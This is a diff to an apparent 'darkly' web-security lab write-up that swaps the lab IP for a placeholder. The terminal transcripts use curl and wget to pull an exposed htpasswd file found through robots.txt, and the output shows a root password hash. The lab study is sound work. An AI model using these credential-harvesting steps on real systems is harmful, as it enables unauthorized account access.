@@ -7,12 +7,12 @@ If we go to <http://[VM_IP]/robots.txt> we will find 2 folders disallowed - `/wh
 Let's check <http://[VM_IP]/whatever/>
 
 ```
-daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.135/whatever/
-*   Trying 192.168.31.135:80...
+daniseed@DESKTOP:~/darkly$  curl -v [VM_IP]/whatever/
+*   Trying [VM_IP]:80...
 * TCP_NODELAY set
-* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
+* Connected to [VM_IP] ([VM_IP]) port 80 (#0)
 > GET /whatever/ HTTP/1.1
-> Host: 192.168.31.135
+> Host: [VM_IP]
 > User-Agent: curl/7.68.0
 > Accept: */*
 >
@@ -31,14 +31,14 @@ daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.135/whatever/
 <a href="htpasswd">htpasswd</a>                                           29-Jun-2021 18:09                  38
 </pre><hr></body>
 </html>
-* Connection #0 to host 192.168.31.135 left intact
+* Connection #0 to host [VM_IP] left intact
 
 
-*   Trying 192.168.31.135:80...
+*   Trying [VM_IP]:80...
 * TCP_NODELAY set
-* Connected to 192.168.31.135 (192.168.31.135) port 80 (#0)
+* Connected to [VM_IP] ([VM_IP]) port 80 (#0)
 > GET /whatever/htpasswd HTTP/1.1
-> Host: 192.168.31.135
+> Host: [VM_IP]
 > User-Agent: curl/7.68.0
 > Accept: */*
 >
@@ -54,15 +54,15 @@ daniseed@DESKTOP:~/darkly$  curl -v 192.168.31.135/whatever/
 < Accept-Ranges: bytes
 <
 root:437394baff5aa33daa618be47b75cb49
-* Connection #0 to host 192.168.31.135 left intact
+* Connection #0 to host [VM_IP] left intact
 ```
 
 OR
 
 ```
-daniseed@DESKTOP:~/darkly$ wget http://192.168.31.135/whatever/htpasswd
---2023-05-09 18:05:11--  http://192.168.31.135/whatever/htpasswd
-Connecting to 192.168.31.135:80... connected.
+daniseed@DESKTOP:~/darkly$ wget http://[VM_IP]/whatever/htpasswd
+--2023-05-09 18:05:11--  http://[VM_IP]/whatever/htpasswd
+Connecting to [VM_IP]:80... connected.
 HTTP request sent, awaiting response... 200 OK
 Length: 38 [application/octet-stream]
 Saving to: ‘htpasswd’
